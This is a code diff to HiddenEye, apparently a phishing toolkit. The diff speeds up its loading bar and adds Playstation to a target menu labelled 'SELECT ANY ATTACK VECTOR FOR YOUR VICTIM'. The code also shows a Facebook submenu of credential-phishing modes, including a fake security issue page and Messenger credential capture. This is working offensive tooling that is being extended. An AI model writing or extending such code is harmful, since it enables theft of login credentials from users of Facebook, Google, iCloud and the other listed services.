@@ -166,7 +166,7 @@ def runMainMenu(): #menu where user select what they wanna use
         exit(0)
 
     for i in range(101):
-        sleep(0.05)
+        sleep(0.005)
         stdout.write("\r")
         stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(RED, DEFAULT, i))
         stdout.flush()
@@ -191,7 +191,7 @@ def runMainMenu(): #menu where user select what they wanna use
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
               {3} ______________________________________   
            _______________________________________________''').format(CYAN, DEFAULT, CYAN, RED))    
-    option = input(_("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n {0}[{1}01{0}]{1} Facebook\n {0}[{1}02{0}]{1} Google\n {0}[{1}03{0}]{1} LinkedIn\n {0}[{1}04{0}]{1} GitHub\n {0}[{1}05{0}]{1} StackOverflow\n {0}[{1}06{0}]{1} WordPress\n {0}[{1}07{0}]{1} Twitter\n {0}[{1}08{0}]{1} Instagram\n {0}[{1}09{0}]{1} Snapchat\n {0}[{1}10{0}]{1} Yahoo\n {0}[{1}11{0}]{1} Twitch\n {0}[{1}12{0}]{1} Microsoft\n {0}[{1}13{0}]{1} Steam\n {0}[{1}14{0}]{1} VK\n {0}[{1}15{0}]{1} iCloud\n\n{0}HiddenEye >>>  {1}").format(RED, CYAN))
+    option = input(_("\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n {0}[{1}01{0}]{1} Facebook\n {0}[{1}02{0}]{1} Google\n {0}[{1}03{0}]{1} LinkedIn\n {0}[{1}04{0}]{1} GitHub\n {0}[{1}05{0}]{1} StackOverflow\n {0}[{1}06{0}]{1} WordPress\n {0}[{1}07{0}]{1} Twitter\n {0}[{1}08{0}]{1} Instagram\n {0}[{1}09{0}]{1} Snapchat\n {0}[{1}10{0}]{1} Yahoo\n {0}[{1}11{0}]{1} Twitch\n {0}[{1}12{0}]{1} Microsoft\n {0}[{1}13{0}]{1} Steam\n {0}[{1}14{0}]{1} VK\n {0}[{1}15{0}]{1} iCloud\n {0}[{1}16{0}]{1} Playstation\n\n{0}HiddenEye >>>  {1}").format(RED, CYAN))
     if option == '1' or option == '01':
         loadModule('Facebook')
         customOption = input(_("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n{0}HiddenEye >>> {1}").format(RED, CYAN))
